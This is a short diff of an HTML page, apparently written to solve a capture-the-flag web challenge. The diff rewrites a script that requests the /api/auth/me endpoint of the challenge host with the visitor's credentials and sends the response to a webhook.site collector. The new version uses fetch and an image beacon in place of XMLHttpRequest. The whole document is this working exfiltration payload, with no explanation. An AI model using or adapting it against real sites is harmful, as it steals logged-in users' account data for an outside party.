@@ -1,31 +1,13 @@
 <html>
   <head>
     <script>
-      const xml = new XMLHttpRequest();
-      xml.open("GET", "http://challenges.1pc.tf:44503/api/auth/me");
-      xml.onreadystatechange = () => {
-        if (xml.readyState !== XMLHttpRequest.DONE) {
-          return;
-        }
-
-        const xml2 = new XMLHttpRequest();
-
-        xml2.open(
-          "GET",
-          "https://webhook.site/928db6ca-d5e7-413c-a35b-5ae3195cfb5a?data=" +
-            xml.responseText,
-        );
-        xml2.onreadystatechange = () => {
-          if (xml.readyState !== XMLHttpRequest.DONE) {
-            return;
-          }
-
-          console.log("DONE");
-        };
-
-        xml2.send();
-      };
-      xml.send();
+      fetch('http://challenges.1pc.tf:44503/api/auth/me')
+  .then(r => r.text())
+  .then(data => {
+    new Image().src =
+      'https://webhook.site/928db6ca-d5e7-413c-a35b-5ae3195cfb5a?d=' +
+      encodeURIComponent(data);
+  });
     </script>
   </head>
   <body></body>
